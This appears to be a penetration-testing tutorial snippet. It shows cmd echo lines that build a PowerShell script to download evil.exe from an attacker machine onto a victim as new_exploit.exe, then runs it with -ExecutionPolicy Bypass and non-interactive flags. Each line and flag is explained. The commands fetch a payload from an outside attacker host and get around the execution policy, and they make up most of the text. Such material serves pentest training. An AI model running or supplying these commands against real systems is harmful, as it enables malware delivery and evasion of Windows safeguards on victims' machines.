echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >> wget.ps1
echo $url = "http://192.168.xx.xx/evil.exe" >> wget.ps1
echo $file = "new_exploit.exe" >> wget.ps1
echo $webclient.DownloadFile($url, $file) >> wget.ps1

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1





$storageDir = $pwd
- The $storageDir variable stores the current working directory.
$webclient = New-Object System.Net.WebClient
- A WebClient object is created that allows downloading files over HTTP.
$url = “http://192.168.10.5/evil.exe”
- Specifies the URL of the file (the evil.exe file is located on the attacking machine).
$file = “new_exploit.exe”
- Specifies the name under which the file will be saved on the victim (new_exploit.exe).
$webclient.DownloadFile($url, $file)
- Downloads a file from the specified URL and saves it under the name new_exploit.exe in the current directory.


After creating wget.ps1, the attacker executes the command:
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

powershell.exe - Starts PowerShell.
-ExecutionPolicy Bypass - Disables the script execution policy (script execution is blocked by default in Windows PowerShell).
-NoLogo - Hides the PowerShell splash screen at startup.
-NonInteractive - Runs without interactive mode (without prompting the user for input).
-NoProfile - Disables loading the user profile (speeds up execution).
-File wget.ps1 - Runs the created wget.ps1 script.